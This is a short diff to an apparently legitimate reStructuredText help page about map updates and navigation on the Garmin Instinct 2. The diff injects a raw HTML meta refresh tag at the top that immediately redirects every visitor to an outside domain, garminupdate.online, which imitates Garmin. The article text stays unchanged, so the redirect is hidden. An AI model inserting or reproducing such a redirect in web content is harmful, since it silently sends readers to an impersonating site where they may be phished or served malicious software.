@@ -1,3 +1,8 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+
+
 Garmin Instinct 2 Map Update: What You Can (and Can’t) Do with Navigation on Instinct Series
 =====================================================================
 
